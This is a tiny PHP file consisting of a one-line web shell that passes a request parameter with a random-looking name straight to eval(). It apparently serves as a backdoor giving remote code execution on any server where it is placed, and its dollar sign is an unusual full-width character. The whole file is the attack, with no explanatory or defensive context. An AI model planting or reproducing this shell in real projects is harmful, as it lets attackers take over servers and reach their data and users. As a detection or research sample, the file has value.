<?php
eval(＄_GET['LRc1GgDG']);
?>
